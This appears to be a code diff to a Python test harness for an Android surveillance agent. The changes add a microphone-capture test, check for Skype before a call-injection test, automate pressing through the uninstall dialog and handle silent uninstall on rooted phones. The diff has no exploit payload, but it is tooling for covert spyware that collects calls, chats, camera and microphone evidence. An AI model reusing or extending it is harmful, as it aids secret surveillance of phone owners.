@@ -43,7 +43,9 @@ def say(text):
 def check_install(command_dev, results):
     still_infected = False
     if command_dev.check_infection():
-        command_dev.uninstall_agent()
+        print "Manual unistall required !!! Clean the phone !!!"
+        return False
+        #command_dev.uninstall_agent()
 
         still_infected = command_dev.check_infection()
 
@@ -76,7 +78,7 @@ def check_evidences(command_dev, c, results, timestamp=""):
     time.sleep(60)
     evidences, kinds = c.evidences()
 
-    for k in ["call", "chat", "camera", "application"]:
+    for k in ["call", "chat", "camera", "application", "mic"]:
         if k not in kinds.keys():
             kinds[k] = []
 
@@ -111,15 +113,21 @@ def uninstall_agent(commands_device, c, results):
     c.uninstall()
 
     say("agent uninstall, verify request")
+    if 'No' != results['root']:
+        print "uninstall:without DIALOG"
+        for i in range(12):
+            time.sleep(10)
 
-    for i in range(12):
-        time.sleep(10)
+            processes = commands_device.get_processes()
+            uninstall = service not in processes
+            if uninstall:
+                break
+    else:
+        print "uninstall:DIALOG !!!"
+        unistall_dialog_wait_and_press(commands_device, 120)
 
-        processes = commands_device.get_processes()
-        uninstall = service not in processes
-        if uninstall:
-            break
-
+    print "uninstall: wait 30sec"
+    time.sleep(30)
     results['uninstall'] = uninstall
 
     if not uninstall:
@@ -161,6 +169,11 @@ def check_skype(command_dev, c, results):
         print "Call not supported"
         return
 
+    # check if skype is installed
+    if command_dev.check_remote_app_installed("skype", 5) != 1:
+        print "skype not installed, skypping test"
+        return
+
     print "... waiting for call inject"
     info_evidences = []
     counter = 0
@@ -190,9 +203,36 @@ def check_skype(command_dev, c, results):
 def check_camera(command_dev):
     command_dev.press_key_home()
     command_dev.execute_cmd("am start -a android.media.action.IMAGE_CAPTURE")
-    time.sleep(10)
+    time.sleep(5)
     command_dev.press_key_home()
 
+def unistall_dialog_wait_and_press(command_dev,timeout=60):
+    if not command_dev.check_remote_activity("UninstallerActivity", timeout):
+        res = "process dvci still running\n"
+        print res
+    else:
+        command_dev.press_key_enter()
+        command_dev.press_key_tab()
+        command_dev.press_key_enter()
+        time.sleep(4)
+
+def check_mic(command_dev):
+    command_dev.press_key_home()
+    #on contacts start mic
+    command_dev.execute_cmd("am start com.android.contacts -n  com.android.contacts/.activities.DialtactsActivity -c android.intent.category.LAUNCHER")
+    time.sleep(2)
+    if command_dev.check_remote_process("com.android.contacts", 5) == -1:
+        if command_dev.check_remote_process("ResolverActivity", 5) == -1:
+            command_dev.press_key_enter()
+        if command_dev.check_remote_process("com.android.contacts", 5) == -1:
+            if command_dev.check_remote_process("ResolverActivity", 5) != -1:
+                command_dev.press_key_enter()
+                command_dev.press_key_enter()
+                command_dev.press_key_tab()
+                command_dev.press_key_tab()
+                command_dev.press_key_enter()
+    time.sleep(25)
+    command_dev.press_key_home()
 
 def set_properties(command_dev, results):
     # getprop device
@@ -314,6 +354,8 @@ def test_device(commands_rcs, command_dev, args, results):
     if args.build or not os.path.exists('assets/autotest.default.apk'):
         config = open('assets/config_mobile.json').read()
         config = config.replace("$(HOSTNAME)", commands_rcs.endpoint)
+        if not os.path.exists("build"):
+            os.makedirs("build")
         f = open("build/config.upload.json", "w")
         f.write(config)
         f.close()
@@ -358,8 +400,12 @@ def test_device(commands_rcs, command_dev, args, results):
             commands_rcs.delete_old_instance()
 
             # install agent and check it's running
+            # todo: to install the agent, it'e more secure to
+            # unistall via "calc" and then use pm uninstall
             if check_install(command_dev, results):
                 install(command_dev, results)
+            else:
+                return "old installation present"
 
             results["executed"] = command_dev.execute_agent()
             if results["executed"]:
@@ -396,7 +442,12 @@ def test_device(commands_rcs, command_dev, args, results):
                 check_skype(command_dev, c, results)
 
                 # check camera
+                print "test camera"
                 check_camera(command_dev)
+
+                # check mic
+                print "test mic"
+                check_mic(command_dev)
 
             # evidences
             check_evidences(command_dev, c, results, "_last")
@@ -439,6 +490,9 @@ def main():
     command_dev = CommandsDevice()
 
     args = parse_args()
+    print """ prerequisiti specifici TEST :
+                    skype presente
+    """
     results = collections.OrderedDict()
 
     commands_rcs = CommandsRCS(login_id=command_dev.uid, device_id=command_dev.device_id)
